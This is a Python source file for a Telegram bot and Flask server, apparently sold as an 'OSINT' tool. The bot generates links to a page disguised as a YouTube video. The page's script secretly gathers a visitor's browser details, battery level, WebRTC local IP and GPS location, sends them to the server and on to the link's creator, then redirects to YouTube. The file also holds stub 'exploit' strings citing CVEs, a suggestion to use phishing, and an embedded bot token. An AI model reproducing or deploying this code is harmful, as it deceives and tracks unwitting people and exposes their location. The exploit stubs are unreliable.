import asyncio, threading, os, requests, json, uuid
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder

# --- КОНФИГ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OWNER_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 

app = Flask(__name__)
exploit_vault = {} 

# --- БАЗА ПЕЙЛОАДОВ ---
PAYLOAD_DATABASE = {
    "CHROME": "// [CVE-2024-7971] V8 Type Confusion\n// Позволяет манипулировать памятью движка Chrome.\nlet a = [1.1, 2.2]; function exploit(o) { a[0] = o; }",
    "SAFARI": "// [CVE-2023-32409] WebKit RCE\n// Удаленное выполнение кода через манипуляцию с фреймами.",
    "OTHER": "// Анализ завершен. Прямых векторов не найдено. Используйте фишинг."
}

# --- HTML ЛОВУШКА ---
HTML_TRAP = """
<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta property="og:title" content="YouTube: Новое видео на канале">
    <meta property="og:description" content="1.2 млн просмотров • Доступно в HD">
    <meta property="og:image" content="https://www.youtube.com/img/desktop/yt_1200.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .btn { background: #f00; color: #fff; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; border-radius: 2px; }
    </style>
</head>
<body onclick="scan()">
    <div id="m" style="text-align:center;">
        <div style="border: 2px solid #333; padding: 40px;">
            <div style="width:0;height:0;border-top:20px solid transparent;border-left:30px solid #fff;border-bottom:20px solid transparent;margin:0 auto 20px;"></div>
            <button class="btn">СМОТРЕТЬ</button>
        </div>
    </div>
<script>
async function scan() {
    document.getElementById('m').innerHTML = '<p>Инициализация плеера...</p>';
    let d = { aid: "{{ aid }}", ua: navigator.userAgent, plat: navigator.platform, res: screen.width+"x"+screen.height, cores: navigator.hardwareConcurrency, mem: navigator.deviceMemory };
    try { let b = await navigator.getBattery(); d.bat = Math.round(b.level * 100) + "%"; } catch(e) {}
    try {
        let pc = new RTCPeerConnection(); pc.createDataChannel("");
        pc.createOffer().then(o => pc.setLocalDescription(o));
        pc.onicecandidate = (i) => { if(i && i.candidate) d.lip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1]; };
    } catch(e) {}
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((p) => { d.gps = p.coords.latitude+","+p.coords.longitude; d.acc = p.coords.accuracy+"m"; send(d); }, () => { send(d); }, {timeout:3000});
    } else { send(d); }
    setTimeout(() => { if(!window.s) send(d); }, 4500);
}
function send(d) {
    if(window.s) return; window.s = true;
    fetch('/catch', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
    .finally(() => { location.href = "https://youtube.com"; });
}
</script>
</body>
</html>
"""

# --- МАРШРУТЫ FLASK ---

@app.route('/')
def keep_alive():
    # Главная страница для Cron-job (всегда 200 OK)
    return "SYSTEM_ACTIVE", 200

@app.route('/t/<aid>/yt')
def trap(aid):
    return render_template_string(HTML_TRAP, aid=aid)

@app.route('/catch', methods=['POST'])
def catch():
    d = request.json
    ips = request.headers.get('X-Forwarded-For', request.remote_addr)
    token = "EXP-" + str(uuid.uuid4())[:6].upper()
    
    ua = d.get('ua', '')
    p_key = "CHROME" if "Chrome" in ua else "SAFARI" if "Safari" in ua else "OTHER"
    exploit_vault[token] = PAYLOAD_DATABASE.get(p_key)

    report = (
        f"🚨 **ЦЕЛЬ В СЕТИ**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 **СЕТЬ:**\n"
        f"• IP: `{ips}`\n"
        f"• Local: `{d.get('lip', 'N/A')}`\n\n"
        f"📍 **ГЕО:** `{d.get('gps', 'N/A')}`\n"
        f"🔗 [Карта](https://www.google.com/maps?q={d.get('gps')})\n\n"
        f"💻 **ЖЕЛЕЗО:** {d.get('cores')} Cores | {d.get('mem')}GB\n"
        f"🔋 **БАТАРЕЯ:** {d.get('bat', 'N/A')}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔍 **SECURITY:**\n"
        f"🔑 **КРИПТО-КЛЮЧ:** `{token}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"⚠️ *Для расшифровки кода обратитесь к создателю.*"
    )
    
    url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown"})
    return "OK", 200

# --- ЛОГИКА БОТА ---
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

def get_main_kb():
    kb = ReplyKeyboardBuilder()
    kb.button(text="🚀 Создать ссылку")
    kb.button(text="📊 Статистика")
    return kb.as_markup(resize_keyboard=True)

@dp.message(Command("start"))
async def start(message: types.Message):
    await message.answer("💀 **OSINT HUB v14.3**\nСистема готова.", reply_markup=get_main_kb())

@dp.message(F.text == "🚀 Создать ссылку")
async def create(message: types.Message):
    link = f"{BASE_URL}/t/{message.from_user.id}/yt"
    await message.answer(f"✅ **Ссылка готова:**\n`{link}`\n\n*В Viber/TG подтянется превью YouTube.*")

@dp.message(F.text == "📊 Статистика")
async def stats(message: types.Message):
    await message.answer("📊 Мониторинг запущен. Ожидайте новых целей.")

@dp.message(F.text.startswith("EXP-"))
async def decrypt(message: types.Message):
    if message.from_user.id != OWNER_ID:
        await message.answer("❌ Доступ запрещен.")
        return
    token = message.text.strip().upper()
    if token in exploit_vault:
        await message.answer(f"🔓 **КОД ЭКСПЛОИТА ({token}):**\n\n```javascript\n{exploit_vault[token]}\n```", parse_mode="Markdown")
    else:
        await message.answer("❌ Токен не найден.")

async def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=10000), daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
